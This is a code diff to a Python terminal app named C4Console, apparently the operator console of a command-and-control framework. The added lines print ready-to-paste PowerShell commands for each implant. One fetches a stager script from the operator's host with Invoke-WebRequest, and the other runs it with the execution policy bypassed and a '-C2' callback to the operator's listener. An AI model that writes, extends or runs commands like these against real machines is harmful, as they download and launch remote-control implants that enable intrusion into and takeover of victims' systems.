@@ -667,8 +667,12 @@ class C4Console(App):
                 for name in implant_dirs:
                     self._log(f"  [cyan]{name}[/]")
                     self._log(
-                        f"    [dim]Invoke-WebRequest -Uri http://{self._local_ip}:{self.listen_port}"
+                        f"    [dim]fetch: Invoke-WebRequest -Uri http://{self._local_ip}:{self.listen_port}"
                         f"/serve/{name}/rc_stager_full.ps1 -OutFile C:\\temp\\stager.ps1[/]"
+                    )
+                    self._log(
+                        f"    [dim]start: powershell -ep Bypass -File C:\\temp\\stager.ps1"
+                        f" -C2 {self._local_ip}:{self.tcp_port}[/]"
                     )
             else:
                 self._log("[dim]No implant instances found in serve directory.[/]")
@@ -980,8 +984,12 @@ class C4Console(App):
             self._log(f"  [cyan]{d.name}[/]")
             if _SERVE_DIR and hasattr(self, "_local_ip"):
                 self._log(
-                    f"    [dim]Invoke-WebRequest -Uri http://{self._local_ip}:{self.listen_port}"
+                    f"    [dim]fetch: Invoke-WebRequest -Uri http://{self._local_ip}:{self.listen_port}"
                     f"/serve/{d.name}/rc_stager_full.ps1 -OutFile C:\\temp\\stager.ps1[/]"
+                )
+                self._log(
+                    f"    [dim]start: powershell -ep Bypass -File C:\\temp\\stager.ps1"
+                    f" -C2 {self._local_ip}:{self.tcp_port}[/]"
                 )
             self._log(f"    [dim]files: {', '.join(files)}[/]")
         self._log("")
@@ -1026,6 +1034,15 @@ class C4Console(App):
                     self._log(f"[bold green]Available implants ({len(implant_dirs)}):[/]")
                     for name in implant_dirs:
                         self._log(f"  [cyan]{name}[/]")
+                        if hasattr(self, "_local_ip"):
+                            self._log(
+                                f"    [dim]fetch: Invoke-WebRequest -Uri http://{self._local_ip}:{self.listen_port}"
+                                f"/serve/{name}/rc_stager_full.ps1 -OutFile C:\\temp\\stager.ps1[/]"
+                            )
+                            self._log(
+                                f"    [dim]start: powershell -ep Bypass -File C:\\temp\\stager.ps1"
+                                f" -C2 {self._local_ip}:{self.tcp_port}[/]"
+                            )
             else:
                 self._log(f"\n[bold red]Build failed (exit code {proc.returncode})[/]")
         except Exception as e:
